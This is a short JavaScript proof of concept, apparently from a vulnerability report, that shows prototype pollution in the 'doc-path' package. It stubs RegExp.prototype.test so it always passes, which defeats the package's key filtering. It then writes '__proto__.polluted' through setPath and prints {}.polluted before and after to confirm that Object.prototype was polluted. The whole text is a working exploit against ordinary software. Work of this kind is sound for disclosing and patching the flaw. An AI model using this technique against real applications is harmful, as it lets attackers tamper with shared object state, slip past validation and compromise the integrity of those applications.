RegExp.prototype.test = () => true;
const path = require('doc-path');
let obj = {};
console.log({}.polluted);
path.setPath({}, '__proto__.polluted', 'yes');
console.log({}.polluted);